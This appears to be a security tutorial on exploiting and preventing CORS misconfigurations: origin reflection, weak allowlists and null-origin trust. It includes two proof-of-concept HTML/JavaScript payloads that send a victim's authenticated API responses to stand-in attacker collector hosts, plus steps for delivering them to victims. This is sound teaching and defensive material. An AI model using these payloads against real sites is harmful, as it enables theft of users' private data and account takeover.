CORS (Cross-Origin Resource Sharing) is a browser security mechanism that relaxes the Same-Origin Policy (SOP) in a controlled way, allowing a web page on one origin to make requests to a different origin — but only if that origin explicitly opts in via response headers. Misconfigured CORS effectively re-opens the door SOP was meant to close, letting an attacker's page read authenticated responses from the victim's session on the vulnerable site.

You can identify that a resource uses CORS by checking the HTTP response headers:

```http
Access-Control-Allow-Origin: <origin>
Access-Control-Allow-Credentials: <true | false>
Access-Control-Allow-Methods: <methods>
Access-Control-Allow-Headers: <headers>
```

- `Access-Control-Allow-Origin` (**ACAO**) tells the browser which origin(s) are permitted to read the response.
- `Access-Control-Allow-Credentials` (**ACAC**) set to `true` tells the browser it's allowed to expose the response even when the request was sent **with cookies/credentials** (`withCredentials = true` / `credentials: 'include'`). This is the flag that turns a CORS misconfiguration from "mildly annoying" into "full account takeover" — without it, an attacker can only read responses to *unauthenticated* requests, which are rarely interesting.

**Note on preflight requests:** "Non-simple" requests (custom headers, `Content-Type: application/json`, methods other than `GET`/`HEAD`/`POST`) trigger an `OPTIONS` preflight first. The server's response to the preflight (`Access-Control-Allow-Methods`, `Access-Control-Allow-Headers`) is what the browser checks before sending the real request — always test the preflight response separately, since some apps secure the main endpoint but leave the preflight handler misconfigured (or vice versa).

Many real-world CORS implementations are insecure and exploitable. Here are the common patterns:

## Basic Origin Reflection

The server blindly reflects whatever `Origin` header the client sends back into `Access-Control-Allow-Origin`, instead of validating it against an allowlist. Send a request with an attacker-controlled origin:

```
Origin: https://attacker-evil.net
```

If the response contains `Access-Control-Allow-Origin: https://attacker-evil.net` **and** `Access-Control-Allow-Credentials: true`, the implementation is exploitable — any origin can read authenticated responses.

PoC (host on the attacker's server, victim needs to visit it while authenticated to the target):

```html
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        // Exfiltrate the victim's authenticated response to our server
        fetch("https://attacker.server/collect", {
            method: "POST",
            body: xhr.responseText
        });
    }
};
xhr.open("GET", "https://victim.site/api/private-data", true);
xhr.withCredentials = true; // send victim's cookies along with the request
xhr.send();
</script>
```

### Related bypass variants worth testing

- **Weak allowlist/regex validation** — if the server trusts `normal-domain.com` via a naive substring or prefix check, register a look-alike domain such as `evilnormal-domain.com` or `normal-domain.com.attacker.net`.
- **Subdomain trust** — if `*.normal-domain.com` is trusted wholesale, a single XSS or subdomain-takeover on *any* subdomain grants access to every other subdomain's authenticated data.
- **Null/undefined handling in regex** — poorly anchored regexes like `normal-domain\.com$` can be bypassed with `attackernormal-domain.com`; always test whether the check is anchored with `^...$` or uses `==` exact match.
- **Protocol/port confusion** — some checks validate the hostname but ignore scheme/port, so `http://normal-domain.com` or `normal-domain.com:4433` may still be trusted even though it's a different origin per the browser's definition.
- **Pre-flight bypass** — if the server allows `Access-Control-Allow-Methods: *` or reflects arbitrary custom headers in `Access-Control-Allow-Headers`, non-simple requests (e.g. `PUT`, `DELETE`, JSON bodies) may be exploitable too, not just simple `GET` requests.

## null Origin Reflection

Some applications explicitly trust the literal string `Origin: null` — often added to accommodate legitimate `null`-origin contexts like sandboxed iframes, `file://` pages, or redirects — without realizing an attacker can trivially generate a `null` origin themselves via a sandboxed iframe.

If the server returns `Access-Control-Allow-Origin: null` with `Access-Control-Allow-Credentials: true`, it's exploitable:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('GET','https://victim.com/api/private-data',true);
req.withCredentials = true;
req.send();
function reqListener() {
    // exfiltrate the stolen response via redirect (or use fetch to a collector instead)
    location = 'https://attacker-server.com/collect?data=' + encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

The `sandbox` attribute (without `allow-same-origin`) is what forces the iframe's origin to serialize as `null`, which is what triggers the vulnerable check on the server side.

## Exploiting

1. Identify the vulnerable pattern (reflection, weak allowlist, null-origin trust) using the techniques above.
2. Confirm `Access-Control-Allow-Credentials: true` is present — without it, cookies/session data won't be sent or exposed, and impact is limited to non-sensitive/public data.
3. Identify a sensitive authenticated endpoint to target (account details, API keys, CSRF tokens, private messages, admin functionality).
4. Host a PoC page on an attacker-controlled origin and deliver it to the victim (phishing link, stored XSS, malicious ad, etc.).
5. Exfiltrate the response — the stolen data can then be used directly (session tokens, PII) or chained into further attacks (e.g. a stolen CSRF token enabling a follow-on CSRF/account-takeover attack).

## Preventing

1. **Never dynamically reflect the `Origin` header** into `Access-Control-Allow-Origin`. Validate it against a strict, exact-match server-side allowlist.
2. **Never combine a wildcard or reflected origin with `Access-Control-Allow-Credentials: true`** — browsers actually block this combination for `*`, but a *reflected* specific origin bypasses that protection, so the allowlist check is what matters.
3. **Never trust `Origin: null`** — treat it the same as any other untrusted, non-allowlisted origin.
4. **Anchor allowlist regexes properly** (`^https://(www\.)?normal-domain\.com$`) and use exact string comparison where possible instead of `contains`/`startsWith`/unanchored regex matching.
5. **Scope trust as narrowly as possible** — avoid wildcard-trusting entire subdomain ranges (`*.normal-domain.com`) unless every subdomain is equally trusted and hardened against takeover/XSS.
6. **Validate preflight responses with the same rigor as the main request** — don't let `OPTIONS` handling drift out of sync with the actual endpoint's CORS policy.
7. Where cross-origin access isn't genuinely required, **don't implement CORS at all** — the safest configuration is no `Access-Control-Allow-Origin` header.
